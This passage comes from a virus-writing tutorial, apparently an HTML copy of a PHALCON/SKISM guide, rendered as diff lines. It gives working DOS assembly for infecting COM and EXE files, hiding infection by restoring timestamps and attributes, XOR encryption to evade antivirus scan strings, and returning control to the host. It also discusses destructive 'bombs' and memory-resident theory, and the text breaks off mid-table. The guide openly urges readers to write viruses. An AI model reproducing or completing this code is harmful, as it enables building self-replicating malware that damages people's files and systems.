+<p>In this example, BX is assumed to hold a file handle to the program to be checked for infection and virus_size equals the size of the virus. Buffer is assumed to be a three-byte area of empty space. This code fragment reads the first three bytes into buffer and then compares the JMP location (located in the word beginning at buffer+1) to the filesize If the JMP points to virus_size bytes before the EOF, then the file is already infected with this virus. Another method would be to search at a certain location in the file for a marker byte or word. For example:</p>
+<pre class="source">
+          mov     ah, 3Fh                         ; Read the first four
+          mov     cx, 4                           ; bytes of the file into
+          lea     dx, [bp+offset buffer]          ; the buffer.
+          int     21h
+ 
+          cmp     byte ptr [buffer+3], infection_id_byte ; Check the fourth
+          jz      bomb_out                        ; byte for the marker
+  infect_it:
+</pre>
+<h2><a name="p25">STEP 4 - INFECT THE FILE</a></h2>
+<p>This is the "guts" of the virus, the heart of the replicator. Once you have located a potential file, you must save the attributes, time, date, and size for later use. The following is a breakdown of the DTA:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="DTA">
+<tr><th>Offset</th><th>Size </th><th>What it is</th></tr>
+<tr><td>0h </td><td>21 BYTES</td><td>Reserved, varies as per DOS version</td></tr>
+<tr><td>15h </td><td>BYTE </td><td>File attribute</td></tr>
+<tr><td>16h </td><td>WORD </td><td>File time</td></tr>
+<tr><td>18h </td><td>WORD </td><td>File date</td></tr>
+<tr><td>1Ah </td><td>DWORD </td><td>File size</td></tr>
+<tr><td>1Eh </td><td>13 BYTES</td><td>ASCIIZ filename + extension</td></tr>
+</table>
+<p>As you can see, the DTA holds all the vital information about the file that you need. The following code fragment is a sample of how to save the info:</p>
+<pre class="source">
+          lea  si, [bp+offset DTA+15h]            ; Start from attributes
+          mov  cx, 9                              ; Finish with size
+          lea  di, [bp+offset f_attr]             ; Move into your locations
+          rep  movsb
+  ; Variables needed
+  f_attr  db   ?
+  f_time  dw   ?
+  f_date  dw   ?
+  f_size  dd   ?
+</pre>
+<p>You can now change the file attributes to nothing through INT 21h/Function 43h/Subfunction 01h. This is to allow infection of system, hidden, and read only files. Only primitive (or minimal) virii cannot handle such files.</p>
+<pre class="source">
+          lea  dx, [bp+offset DTA+1eh]            ; DX points to filename in
+          mov  ax, 4301h                          ; DTA
+          xor  cx, cx                             ; Clear file attributes
+          int  21h                                ; Issue the call
+</pre>
+<p>Once the attributes have been annihilated, you may open the file with callous impunity. Use a handle open in read/write mode.</p>
+<pre class="source">
+          lea  dx, [bp+offset DTA+1eh]            ; Use filename in DTA
+          mov  ax, 3d02h                          ; Open read/write mode
+          int  21h                                ; duh.
+          xchg ax, bx                             ; Handle is more useful in
+                                                  ; BX
+</pre>
+<p>Now we come to the part you've all been waiting for: the infection routine. I am pleased to present code which will handle the infection of COM files. Yawn, you say, I can already do that with the information presented in the previous installment. Ah, but there is more, much more. A sample EXE infector shall also be presented shortly.</p>
+<p>The theory behind COM file infection was covered in the last installment, so I shall not delve into the details again. Here is a sample infector:</p>
+<pre class="source">
+  ; Sample COM infector.  Assumes BX holds the file handle
+  ; Assume COM file passes infection criteria and not already infected
+          mov     ah, 3fh
+          lea     dx, [bp+buffer1]
+          mov     cx, 3
+          int     21h
+ 
+          mov     ax, 4200h                       ; Move file pointer to
+          xor     cx, cx                          ; the beginning of the
+          xor     dx, dx                          ; file
+          int     21h
+ 
+          mov     byte ptr [bp+buffer2], 0e9h      ; JMP
+          mov     ax, word ptr [bp+f_size]
+          sub     ax, part1_size                   ; Usually 3
+          mov     word ptr [bp+buffer2+1], ax      ; offset of JMP
+ 
+  ; Encode JMP instruction to replace beginning of the file
+          mov     byte ptr [bp+buffer2], 0e9h      ; JMP
+          mov     ax, word ptr [bp+f_size]
+          sub     ax, part1_size                   ; Usually 3
+          mov     word ptr [bp+buffer2+1], ax      ; offset of JMP
+ 
+  ; Write the JMP instruction to the beginning of the file
+          mov     ah, 40h                          ; Write CX bytes to
+          mov     cx, 3                            ; handle in BX from
+          lea     dx, [bp+buffer2]                 ; buffer -> DS:[DX]
+          int     21h
+ 
+          mov     ax, 4202h                        ; Move file pointer to
+          xor     cx, cx                           ; end of file
+          xor     dx, dx
+          int     21h
+ 
+          mov     ah, 40h                          ; Write CX bytes
+          mov     cx, endofvirus - startofpart2    ; Effective size of virus
+          lea     dx, [bp+startofpart2]            ; Begin write at start
+          int     21h
+ 
+  ; Variables
+  buffer1 db 3 dup (?)                             ; Saved bytes from the
+                                                   ; infected file to restore
+                                                   ; later
+  buffer2 db 3 dup (?)                             ; Temp buffer
+</pre>
+<p>After some examination, this code will prove to be easy to understand. It starts by reading the first three bytes into a buffer. Note that you could have done this in an earlier step, such as when you are checking for a previous infection. If you have already done this, you obviously don't need to do it again. This buffer must be stored in the virus so it can be restored later when the code is executed.</p>
+<p>EXE infections are also simple, although a bit harder to understand. First, the thoery. Here is the format of the EXE header:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="EXE header format">
+<tr><th> Ofs</th><th>Name </th><th>Size </th><th>Comments</th></tr>
+<tr><td> 00 </td><td>Signature </td><td>2 bytes </td><td>always 4Dh 5Ah (MZ)</td></tr>
+<tr><td> *02 </td><td>Last Page Size </td><td>1 word </td><td>number of bytes in last page</td></tr>
+<tr><td> *04 </td><td>File Pages </td><td>1 word </td><td>number of 512 byte pages</td></tr>
+<tr><td> 06 </td><td>Reloc Items </td><td>1 word </td><td>number of entries in table</td></tr>
+<tr><td> 08 </td><td>Header Paras </td><td>1 word </td><td>size of header in 16 byte paras</td></tr>
+<tr><td> 0A </td><td>MinAlloc </td><td>1 word </td><td>minimum memory required in paras</td></tr>
+<tr><td> 0C </td><td>MaxAlloc </td><td>1 word </td><td>maximum memory wanted in paras</td></tr>
+<tr><td> *0E </td><td>PreReloc SS </td><td>1 word </td><td>offset in paras to stack segment</td></tr>
+<tr><td> *10 </td><td>Initial SP </td><td>1 word </td><td>starting SP value</td></tr>
+<tr><td> 12 </td><td>Negative checksum </td><td>1 word </td><td>currently ignored</td></tr>
+<tr><td> *14 </td><td>Pre Reloc IP </td><td>1 word </td><td>execution start address</td></tr>
+<tr><td> *16 </td><td>Pre Reloc CS </td><td>1 word </td><td>preadjusted start segment</td></tr>
+<tr><td> 18 </td><td>Reloc table offset </td><td>1 word </td><td>is offset from start of file)</td></tr>
+<tr><td> 1A </td><td>Overlay number </td><td>1 word </td><td>ignored if not overlay</td></tr>
+<tr><td> 1C </td><td>Reserved/unused </td><td>2 words </td><td>&nbsp;</td></tr>
+</table>
+<p><em>* denotes bytes which should be changed by the virus</em></p>
+<p>To understand this, you must first realise that EXE files are structured into segments. These segments may begin and end anywhere. All you have to do to infect an EXE file is tack on your code to the end. It will then be in its own segment. Now all you have to do is make the virus code execute before the program code. Unlike COM infections, no program code is overwritten, although the header is modified. Note the virus can still have the V1/V2 structure, but only V2 needs to be concatenated to the end of the infected EXE file.</p>
+<p>Offset 4 (File Pages) holds the size of the file divided by 512, rounded up. Offset 2 holds the size of the file modulo 512. Offset 0Eh holds the paragraph displacement (relative to the end of the header) of the initial stack segment and Offset 10h holds the displacement (relative to the start of the stack segment) of the initial stack pointer. Offset 16h holds the paragraph displacement of the entry point relative to the end of the header and offset 14h holds the displacement entry point relative to the start of the entry segment. Offset 14h and 16h are the key to adding the startup code (the virus) to the file.</p>
+<p>Before you infect the file, you should save the CS:IP and SS:SP found in the EXE header, as you need to restore them upon execution. Note that SS:SP is NOT stored in Intel reverse-double-word format. If you don't know what I'm talking about, don't worry; it's only for very picky people. You should also save the file length as you will need to use that value several times during the infection routine. Now it's time to calculate some offsets! To find the new CS:IP and SS:SP, use the following code. It assumes the file size is loaded in DX:AX.</p>
+<pre class="source">
+          mov     bx, word ptr [bp+ExeHead+8]    ; Header size in paragraphs
+               ;  ^---make sure you don't destroy the file handle
+          mov     cl, 4                          ; Multiply by 16.  Won't
+          shl     bx, cl                         ; work with headers > 4096
+                                                 ; bytes.  Oh well!
+          sub     ax, bx                         ; Subtract header size from
+          sbb     dx, 0                          ; file size
+    ; Now DX:AX is loaded with file size minus header size
+          mov     cx, 10h                        ; DX:AX/CX = AX Remainder DX
+          div     cx
+</pre>
+<p>This code is rather inefficient. It would probably be easier to divide by 16 first and then perform a straight subtraction from AX, but this happens to be the code I chose. Such is life. However, this code does have some advantages over the more efficient one. With this, you are certain that the IP (in DX) will be under 15. This allows the stack to be in the same segment as the entry point, as long as the stack pointer is a large number.</p>
+<p>Now AX*16+DX points to the end of code. If the virus begins immediately after the end of the code, AX and DX can be used as the initial CS and IP, respectively. However, if the virus has some junk (code or data) before the entry point, add the entry point displacement to DX (no ADC with AX is necessary since DX will always be small).</p>
+<pre class="source">
+          mov     word ptr [bp+ExeHead+14h], dx  ; IP Offset
+          mov     word ptr [bp+ExeHead+16h], ax  ; CS Displacement in module
+</pre>
+<p>The SP and SS can now be calculated. The SS is equal to the CS. The actual value of the SP is irrelevant, as long as it is large enough so the stack will not overwrite code (remember: the stack grows downwards). As a general rule, make sure the SP is at least 100 bytes larger than the virus size. This should be sufficient to avoid problems.</p>
+<pre class="source">
+          mov     word ptr [bp+ExeHead+0Eh], ax  ; Paragraph disp. SS
+          mov     word ptr [bp+ExeHead+10h], 0A000h ; Starting SP
+</pre>
+<p>All that is left to fiddle in the header is the file size. Restore the original file size from wherever you saved it to DX:AX. To calculate DX:AX/512 and DX:AX MOD 512, use the following code:</p>
+<pre class="source">
+          mov     cl, 9                           ; Use shifts again for
+          ror     dx, cl                          ; division
+          push    ax                              ; Need to use AX again
+          shr     ax, cl
+          adc     dx, ax                          ; pages in dx
+          pop     ax
+          and     ah, 1                           ; mod 512 in ax
+ 
+          mov     word ptr [bp+ExeHead+4], dx     ; Fix-up the file size in
+          mov     word ptr [bp+ExeHead+2], ax     ; the EXE header.
+</pre>
+<p>All that is left is writing back the EXE header and concatenating the virus to the end of the file. You want code? You get code.</p>
+<pre class="source">
+          mov     ah, 3fh                         ; BX holds handle
+          mov     cx, 18h                         ; Don't need entire header
+          lea     dx, [bp+ExeHead]
+          int     21h
+ 
+          call    infectexe
+ 
+          mov     ax, 4200h                       ; Rewind to beginning of
+          xor     cx, cx                          ; file
+          xor     dx, dx
+          int     21h
+ 
+          mov     ah, 40h                         ; Write header back
+          mov     cx, 18h
+          lea     dx, [bp+ExeHead]
+          int     21h
+ 
+          mov     ax, 4202h                       ; Go to end of file
+          xor     cx, cx
+          xor     dx, dx
+          int     21h
+ 
+          mov     ah, 40h                         ; Note: Only need to write
+          mov     cx, part2size                   ;       part 2 of the virus
+          lea     dx, [bp+offset part2start]      ;      (Parts of virus
+          int     21h                             ;       defined in first
+                                                  ;       installment of
+                                                  ;       the guide)
+</pre>
+<p>Note that this code alone is not sufficient to write a COM or EXE infector. Code is also needed to transfer control back to the parent program. The information needed to do this shall be presented in the next installment. In the meantime, you can try to figure it out on your own; just remember that you must restore all that you changed.</p>
+<h2><a name="p26">STEP 5 - COVER YOUR TRACKS</a></h2>
+<p>This step, though simple to do, is too easily neglected. It is extremely important, as a wary user will be alerted to the presence of a virus by any unnecessary updates to a file. In its simplest form, it involves the restoration of file attributes, time and date. This is done with the following:</p>
+<pre class="source">
+          mov     ax, 5701h                      ; Set file time/date
+          mov     dx, word ptr [bp+f_date]       ; DX = date
+          mov     cx, word ptr [bp+f_time]       ; CX = time
+          int     21h
+ 
+          mov     ah, 3eh                        ; Handle close file
+          int     21h
+ 
+          mov     ax, 4301h                      ; Set attributes
+          lea     dx, [bp+offset DTA + 1Eh]      ; Filename still in DTA
+          xor     ch, ch
+          mov     cl, byte ptr [bp+f_attrib]     ; Attribute in CX
+          int     21h
+</pre>
+<p>Remember also to restore the directory back to the original one if it changed during the run of the virus.</p>
+<h2><a name="p27">WHAT'S TO COME</a></h2>
+<p>I have been pleased with the tremendous response to the last installment of the guide. Next time, I shall cover the rest of the virus as well as various tips and common tricks helpful in writing virii. Until then, make sure you look for 40Hex, the official PHALCON/SKISM magazine, where we share tips and information pertinent to the virus community.</p>
+<h2>Part III</h2>
+<div align="right">
+"It's the right thing to do"
+</div>
+<h2><a name="p31">INSTALLMENT III: NONRESIDENT VIRII, PART II</a></h2>
+<p>Welcome to the third installment of my Virus Writing Guide. In the previous installment, I covered the primary part of the virus - the replicator. As promised, I shall now cover the rest of the nonresident virus and present code which, when combined with code from the previous installment, will be sufficient to allow anyone to write a simple virus. Additionally, I will present a few easy tricks and tips which can help optimise your code.</p>
+<h2><a name="p32">THE CONCEALER</a></h2>
+<p>The concealer is the most common defense virus writers use to avoid detection of virii. The most common encryption/decryption routine by far is the XOR, since it may be used for both encryption and decryption.</p>
+<pre class="source">
+  encrypt_val   dw   ?   ; Should be somewhere in decrypted area
+ 
+  decrypt:
+  encrypt:
+       mov dx, word ptr [bp+encrypt_val]
+       mov cx, (part_to_encrypt_end - part_to_encrypt_start + 1) / 2
+       lea si, [bp+part_to_encrypt_start]
+       mov di, si
+ 
+  xor_loop:
+       lodsw
+       xor ax, dx
+       stosw
+       loop xor_loop
+</pre>
+<p>The previous routine uses a simple XOR routine to encrypt or decrypt code in memory. This is essentially the same routine as the one in the first installment, except it encrypts words rather than bytes. It therefore has 65,535 mutations as opposed to 255 and is also twice as fast. While this routine is simple to understand, it leaves much to be desired as it is large and therefore is almost begging to be a scan string. A better method follows:</p>
+<pre class="source">
+  encrypt_val   dw    ?
+ 
+  decrypt:
+  encrypt:
+       mov dx, word ptr [bp+encrypt_val]
+       lea bx, [bp+part_to_encrypt_start]
+       mov cx, (part_to_encrypt_end - part_to_encrypt_start + 1) / 2
+ 
+  xor_loop:
+       xor word ptr [bx], dx
+       add bx, 2
+       loop xor_loop
+</pre>
+<p>Although this code is much shorter, it is possible to further reduce its size. The best method is to insert the values for the encryption value, BX, and CX, in at infection-time.</p>
+<pre class="source">
+  decrypt:
+  encrypt:
+       mov bx, 0FFFFh
+       mov cx, 0FFFFh
+ 
+  xor_loop:
+       xor word ptr [bx], 0FFFFh
+       add bx, 2
+       loop xor_loop
+</pre>
+<p>All the values denoted by 0FFFFh may be changed upon infection to values appropriate for the infected file. For example, BX should be loaded with the offset of part_to_encrypt_start relative to the start of the infected file when the encryption routine is written to the infected file.</p>
+<p>The primary advantage of the code used above is the minimisation of scan code length. The scan code can only consist of those portions of the code which remain constant. In this case, there are only three or four consecutive bytes which remain constant. Since the entire encryption consist of only about a dozen bytes, the size of the scan code is extremely tiny.</p>
+<p>Although the function of the encryption routine is clear, perhaps the initial encryption value and calculation of subsequent values is not as lucid. The initial value for most XOR encryptions should be 0. You should change the encryption value during the infection process. A random encryption value is desired. The simplest method of obtaining a random number is to consult to internal clock. A random number may be easily obtained with a simple:</p>
+<pre class="source">
+          mov     ah, 2Ch                         ; Get me a random number.
+          int     21h
+          mov     word ptr [bp+encrypt_val], dx   ; Can also use CX
+</pre>
+<p>Some encryption functions do not facilitate an initial value of 0. For an example, take a look at Whale. It uses the value of the previous word as an encryption value. In these cases, simply use a JMP to skip past the decryption routine when coding the virus. However, make sure infections JMP to the right location! For example, this is how you would code such a virus:</p>
+<pre class="source">
+          org     100h
+ 
+  start:
+          jmp     past_encryption
+ 
+  ; Insert your encryption routine here
+ 
+  past_encryption:
+</pre>
+<p>The encryption routine is the ONLY part of the virus which needs to be unencrypted. Through code-moving techniques, it is possible to copy the infection mechanism to the heap (memory location past the end of the file and before the stack). All that is required is a few MOVSW instructions and one JMP. First the encryption routine must be copied, then the writing, then the decryption, then the RETurn back to the program. For example:</p>
+<pre class="source">
+       lea si, [bp+encryption_routine]
+       lea di, [bp+heap]
+       mov cx, encryption_routine_size
+       push si
+       push cx
+       rep movsb
+ 
+       lea si, [bp+writing_routine]
+       mov cx, writing_routine_size
+       rep movsb
+ 
+       pop cx
+       pop si
+       rep movsb
+ 
+       mov al, 0C3h                             ; Tack on a near return
+       stosb
+ 
+       call [bp+heap]
+</pre>
+<p>Although most virii, for simplicity's sake, use the same routine for both encryption and decryption, the above code shows this is completely unnecessary. The only modification of the above code for inclusion of a separate decryption routine is to take out the PUSHes and replace the POPs with the appropriate LEA si and MOV cx.</p>
+<p>Original encryption routines, while interesting, might not be the best. Stolen encryption routines are the best, especially those stolen from encrypted shareware programs! Sydex is notorious for using encryption in their shareware programs. Take a look at a shareware program's puny encryption and feel free to copy it into your own. Hopefully, the anti-viral developers will create a scan string which will detect infection by your virus in shareware products simply because the encryption is the same.</p>
+<p>Note that this is not a full treatment of concealment routines. A full text file could be written on encryption/decryption techniques alone. This is only the simplest of all possible encryption techniques and there are far more concealment techniques available. However, for the beginner, it should suffice.</p>
+<h2><a name="p33">THE DISPATCHER</a></h2>
+<p>The dispatcher is the portion of the virus which restores control back to the infected program. The dispatchers for EXE and COM files are, naturally, different.</p>
+<p>In COM files, you must restore the bytes which were overwritten by your virus and then transfer control back to CS:100h, which is where all COM files are initially loaded.</p>
+<pre class="source">
+  RestoreCOM:
+       mov di, 100h                     ; We are copying to the beginning
+       lea si, [bp+savebuffer]          ; We are copying from our buffer
+       push di                          ; Save offset for return (100h)
+       movsw                            ; Mo efficient than mov cx, 3, movsb
+       movsb                            ; Alter to meet your needs
+       retn                             ; A JMP will also work
+</pre>
+<p>EXE files require simply the restoration of the stack segment/pointer and the code segment/instruction pointer.</p>
+<pre class="source">
+  ExeReturn:
+          mov     ax, es                           ; Start at PSP segment
+          add     ax, 10h                          ; Skip the PSP
+          add     word ptr cs:[bp+ExeWhereToJump+2], ax
+          cli
+          add     ax, word ptr cs:[bp+StackSave+2] ; Restore the stack
+          mov     ss, ax
+          mov     sp, word ptr cs:[bp+StackSave]
+          sti
+          db      0eah                             ; JMP FAR PTR SEG:OFF
+  ExeWhereToJump:
+          dd      0
+  StackSave:
+          dd      0
+ 
+  ExeWhereToJump2 dd 0
+  StackSave2      dd 0
+</pre>
+<p>Upon infection, the initial CS:IP and SS:SP should be stored in ExeWhereToJump2 and StackSave2, respectively. They should then be moved to ExeWhereToJump and StackSave before restoration of the program. This restoration may be easily accomplished with a series of MOVSW instructions.</p>
+<p>Some like to clear all the registers prior to the JMP/RET, i.e. they issue a bunch of XOR instructions. If you feel happy and wish to waste code space, you are welcome to do this, but it is unnecessary in most instances.</p>
+<h2><a name="p34">THE BOMB</a></h2>
+<div align="right">
+"The horror! The horror!"<br/>
+- Joseph Conrad, The Heart of Darkness
+</div>
+<p>What goes through the mind of a lowly computer user when a virus activates? What terrors does the unsuspecting victim undergo as the computer suddenly plays a Nazi tune? How awful it must be to lose thousands of man-hours of work in an instant!</p>
+<p>Actually, I do not support wanton destruction of data and disks by virii. It serves no purpose and usually shows little imagination. For example, the world-famous Michelangelo virus did nothing more than overwrite sectors of the drive with data taken at random from memory. How original. Yawn. Of course, if you are hell-bent on destruction, go ahead and destroy all you want, but just remember that this portion of the virus is usually the only part seen by "end-users" and distinguishes it from others. The best examples to date include: Ambulance Car, Cascade, Ping Pong, and Zero Hunt. Don't forget the PHALCON/SKISM line, especially those by me (I had to throw in a plug for the group)!</p>
+<p>As you can see, there's no code to speak of in this section. Since all bombs should be original, there isn't much point of putting in the code for one, now is there! Of course, some virii don't contain any bomb to speak of. Generally speaking, only those under about 500 bytes lack bombs. There is no advantage of not having a bomb other than size considerations.</p>
+<h2><a name="p35">MEA CULPA</a></h2>
+<p>I regret to inform you that the EXE infector presented in the last installment was not quite perfect. I admit it. I made a mistake of colossal proportions The calculation of the file size and file size mod 512 was screwed up. Here is the corrected version:</p>
+<pre class="source">
+  ; On entry, DX:AX hold the NEW file size
+ 
+          push    ax                          ; Save low word of filesize
+          mov     cl, 9                       ; 2^9 = 512
+          shr     ax, cl                      ; / 512
+          ror     dx, cl                      ; / 512 (sort of)
+          stc                                 ; Check EXE header description
+                                              ; for explanation of addition
+          adc     dx, ax                      ; of 1 to the DIV 512 portion
+          pop     ax                          ; Restore low word of filesize
+          and     ah, 1                       ; MOD 512
+</pre>
+<p>This results in the file size / 512 + 1 in DX and the file size modulo 512 in AX. The rest remains the same. Test your EXE infection routine with Microsoft's LINK.EXE, since it won't run unless the EXE infection is perfect.</p>
+<p>I have saved you the trouble and smacked myself upside the head for this dumb error.</p>
+<h2><a name="p36">TIPS AND TRICKS</a></h2>
+<p>So now all the parts of the nonresident virus have been covered. Yet I find myself left with several more K to fill. So, I shall present several simple techniques anyone can incorporate into virii to improve efficiency.</p>
+<h3>1. Use the heap</h3>
+<p>The heap is the memory area between the end of code and the bottom of the stack. It can be conveniently treated as a data area by a virus. By moving variables to the heap, the virus need not keep variables in its code, thereby reducing its length. Note that since the contents heap are not part of the virus, only temporary variables should be kept there, i.e. the infection routine should not count the heap as part of the virus as that would defeat the entire purpose of its use. There are two ways of using the heap:</p>
+<pre class="source">
+       ; First method
+ 
+       EndOfVirus:
+       Variable1 equ $
+       Variable2 equ Variable1 + LengthOfVariable1
+       Variable3 equ Variable2 + LengthOfVariable2
+       Variable4 equ Variable3 + LengthOfVariable3
+ 
+       ; Example of first method
+ 
+       EndOfVirus:
+       StartingDirectory = $
+       TemporaryDTA      = StartingDirectory + 64
+       FileSize          = TemporaryDTA + 42
+       Flag              = FileSize + 4
+ 
+       ; Second method
+ 
+       EndOfVirus:
+       Variable1 db LengthOfVariable1 dup (?)
+       Variable2 db LengthOfVariable2 dup (?)
+       Variable3 db LengthOfVariable3 dup (?)
+       Variable4 db LengthOfVariable4 dup (?)
+ 
+       ; Example of second method
+       EndOfVirus:
+       StartingDirectory db 64 dup (?)
+       TemporaryDTA      db 42 dup (?)
+       FileSize          dd ?
+       Flag              db ?
+</pre>
+<p>The two methods differ slightly. By using the first method, you create a file which will be the exact length of the virus (plus startup code). However, when referencing the variables, size specifications such as BYTE PTR, WORD PTR, DWORD PTR, etc. must always be used or the assembler will become befuddled. Secondly, if the variables need to be rearranged for some reason, the entire chain of EQUates will be destroyed and must be rebuilt. Virii coded with second method do not need size specifications, but the resulting file will be larger than the actual size of the virus. While this is not normally a problem, depending on the reinfection check, the virus may infect the original file when run. This is not a big disability, especially considering the advantages of this method.</p>
+<p>In any case, the use of the heap can greatly lessen the effective length of the virus code and thereby make it much more efficient. The only thing to watch out for is infecting large COM files where the heap will "wrap around" to offset 0 of the same segment, corrupting the PSP. However, this problem is easily avoided. When considering whether a COM file is too large to infect for this reason, simply add the temporary variable area size to the virus size for the purposes of the check.</p>
+<h3>2. Use procedures</h3>
+<p>Procedures are helpful in reducing the size of the virus, which is always a desired goal. Only use procedures if they save space. To determine the amount of bytes saved by the use of a procedure, use the following formula:</p>
+<pre>
+	Let PS = the procedure size, in bytes
+	bytes saved = (PS - 4) * number invocations - PS
+</pre>
+<p>For example, the close file procedure,</p>
+<pre class="source">
+       close_file:
+         mov ah, 3eh      ; 2 bytes
+         int 21h          ; 2 bytes
+         ret              ; 1 byte
+                          ; PS = 2+2+1 = 5
+</pre>
+<p>is only viable if it is used 6 or more times, as (5-4)*6 - 5 = 1. A whopping savings of one (1) byte! Since no virus closes a file in six different places, the close file procedure is clearly useless and should be avoided.</p>
+<p>Whenever possible, design the procedures to be as flexible as possible. This is the chief reason why Bulgarian coding is so tight. Just take a look at the source for Creeping Death. For example, the move file pointer procedure:</p>
+<pre class="source">
+       go_eof:
+         mov al, 2
+       move_fp:
+         xor dx, dx
+       go_somewhere:
+         xor cx, cx
+         mov ah, 42h
+         int 21h
+         ret
+</pre>
+<p>The function was build with flexibility in mind. With a CALL to go_eof, the procedure will move the file pointer to the end of the file. A CALL to move_fp with AL set to 0, the file pointer will be reset. A CALL to go_somewhere with DX and AL set, the file pointer may be moved anywhere within the file. If the function is used heavily, the savings could be enormous.</p>
+<h3>3. Use a good assembler and debugger</h3>
+<p>The best assembler I have encountered to date is Turbo Assembler. It generates tight code extremely quickly. Use the /m2 option to eliminate all placeholder NOPs from the code. The advantages are obvious - faster development and smaller code.</p>
+<p>The best debugger is also made by Borland, the king of development tools. Turbo Debugger has so many features that you might just want to buy it so you can read the manual! It can bypass many debugger traps with ease and is ideal for testing. Additionally, this debugger has 286 and 386 specific protected mode versions, each of which are even more powerful than their real mode counterparts.</p>
+<h3>4. Don't use MOV instead of LEA</h3>
+<p>When writing your first virus, you may often forget to use LEA instead of MOV when loading offsets. This is a serious mistake and is often made by beginning virus coders. The harmful effects of such a grevious error are immediately obvious. If the virus is not working, check for this bug. It's almost as hard to catch as a NULL pointer error in C.</p>
+<h3>5. Read the latest issues of 40Hex</h3>
+<p>40Hex, PHALCON/SKISM's official journal of virus techniques and news, is a publication not to be missed by any self-respecting virus writer. Each issue contains techniques and source code, designed to help all virus writers, be they beginners or experts. Virus-related news is also published. Get it, read it, love it, eat it!</p>
+<h2><a name="p37">SO NOW</a></h2>
+<p>you have all the code and information sufficient to write a viable virus, as well as a wealth of techniques to use. So stop reading and start writing! The only way to get better is through practise. After two or three tries, you should be well on your way to writing good virii.</p>
+<h2>Part IV</h2>
+<div align="right">
+"It's the cheesiest"<br/>
+- Kraft
+</div>
+<h2><a name="p41">INSTALLMENT IV: RESIDENT VIRII, PART I</a></h2>
+<p>Now that the topic of nonresident virii has been addressed, this series now turns to memory resident virii. This installment covers the theory behind this type of virus, although no code will be presented. With this knowledge in hand, you can boldly write memory resident virii confident that you are not fucking up too badly.</p>
+<h2><a name="p42">INTERRUPTS</a></h2>
+<p>DOS kindly provides us with a powerful method of enhancing itself, namely memory resident programs. Memory resident programs allow for the extention and alteration of the normal functioning of DOS. To understand how memory resident programs work, it is necessary to delve into the intricacies of the interrupt table. The interrupt table is located from memory location 0000:0000 to 0000:0400h (or 0040:0000), just below the BIOS information area. It consists of 256 double words, each representing a segment:offset pair. When an interrupt call is issued via an INT instruction, two things occur, in this order:</p>
+<ol>
+<li>The flags are pushed onto the stack.</li>
+<li>A far call is issued to the segment:offset located in the interrupt table.</li>
+</ol>
+<p>To return from an interrupt, an iret instruction is used. The iret instruction reverses the order of the int call. It performs a retf followed by a popf. This call/return procedure has an interesting sideeffect when considering interrupt handlers which return values in the flags register. Such handlers must directly manipulate the flags register saved in the stack rather than simply directly manipulating the register.</p>
+<p>The processor searches the interrupt table for the location to call. For example, when an interrupt 21h is called, the processor searches the interrupt table to find the address of the interrupt 21h handler. The segment of this pointer is 0000h and the offset is 21h*4, or 84h. In other words, the interrupt table is simply a consecutive chain of 256 pointers to interrupts, ranging from interrupt 0 to interrupt 255. To find a specific interrupt handler, load in a double word segment:offset pair from segment 0, offset (interrupt number)*4. The interrupt table is stored in standard Intel reverse double word format, i.e. the offset is stored first, followed by the segment.</p>
+<p>For a program to "capture" an interrupt, that is, redirect the interrupt, it must change the data in the interrupt table. This can be accomplished either by direct manipulation of the table or by a call to the appropriate DOS function. If the program manipulates the table directly, it should put this code between a CLI/STI pair, as issuing an interrupt by the processor while the table is half-altered could have dire consequences. Generally, direct manipulation is the preferable alternative, since some primitive programs such as FluShot+ trap the interrupt 21h call used to set the interrupt and will warn the user if any "unauthorised" programs try to change the handler.</p>
+<p>An interrupt handler is a piece of code which is executed when an interrupt is requested. The interrupt may either be requested by a program or may be requested by the processor. Interrupt 21h is an example of the former, while interrupt 8h is an example of the latter. The system BIOS supplies a portion of the interrupt handlers, with DOS and other programs supplying the rest. Generally, BIOS interrupts range from 0h to 1Fh, DOS interrupts range from 20h to 2Fh, and the rest is available for use by programs.</p>
+<p>When a program wishes to install its own code, it must consider several factors. First of all, is it supplanting or overlaying existing code, that is to say, is there already an interrupt handler present? Secondly, does the program wish to preserve the functioning of the old interrupt handler? For example, a program which "hooks" into the BIOS clock tick interrupt would definitely wish to preserve the old interrupt handler. Ignoring the presence of the old interrupt handler could lead to disastrous results, especially if previously-loaded resident programs captured the interrupt.</p>
+<p>A technique used in many interrupt handlers is called "chaining." With chaining, both the new and the old interrupt handlers are executed. There are two primary methods for chaining: preexecution and postexecution. With preexecution chaining, the old interrupt handler is called before the new one. This is accomplished via a pseudo-INT call consisting of a pushf followed by a call far ptr. The new interrupt handler is passed control when the old one terminates. Preexecution chaining is used when the new interrupt handler wishes to use the results of the old interrupt handler in deciding the appropriate action to take. Postexecution chaining is more straightforward, simply consisting of a jmp far ptr instruction. This method doesn't even require an iret instruction to be located in the new interrupt handler! When the jmp is executed, the new interrupt handler has completed its actions and control is passed to the old interrupt handler. This method is used primarily when a program wishes to intercept the interrupt call before DOS or BIOS gets a chance to process it.</p>
+<h2><a name="p43">AN INTRODUCTION TO DOS MEMORY ALLOCATION</a></h2>
+<p>Memory allocation is perhaps one of the most difficult concepts, certainly the hardest to implement, in DOS. The problem lies in the lack of official documentation by both Microsoft and IBM. Unfortunately, knowledge of the DOS memory manager is crucial in writing memory-resident virii.</p>
+<p>When a program asks DOS for more memory, the operating system carves out a chunk of memory from the pool of unallocated memory. Although this concept is simple enough to understand, it is necessary to delve deeper in order to have sufficient knowledge to write effective memory-resident virii. DOS creates memory control blocks (MCBs) to help itself keep track of these chunks of memory. MCBs are paragraph-sized areas of memory which are each devoted to keeping track of one particular area of allocated memory. When a program requests memory, one paragraph for the MCB is allocated in addition to the memory requested by the program. The MCB lies just in front of the memory it controls. Visually, a MCB and its memory looks like:</p>
+<pre>  
+	MCB 1
+	Chunk o' memory controlled by MCB 1
+</pre>
+<p>When a second section of memory is requested, another MCB is created just above the memory last allocated. Visually:</p>
+<pre>  
+	MCB 1
+	Chunk 1
+	MCB 2
+	Chunk 2
+</pre>
+<p>In other words, the MCBs are "stacked" one on top of the other. It is wasteful to deallocate MCB 1 before MCB 2, as holes in memory develop. The structure for the MCB is as follows:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="MCB structure">
+<tr><th>Offset</th><th> Size</th><th>Meaning</th></tr>
+<tr><td>0 </td><td> BYTE</td><td>'M' or 'Z'</td></tr>
+<tr><td>1 </td><td> WORD</td><td>Process ID (PSP of block's owner)</td></tr>
+<tr><td>3 </td><td> WORD</td><td>Size in paragraphs</td></tr>
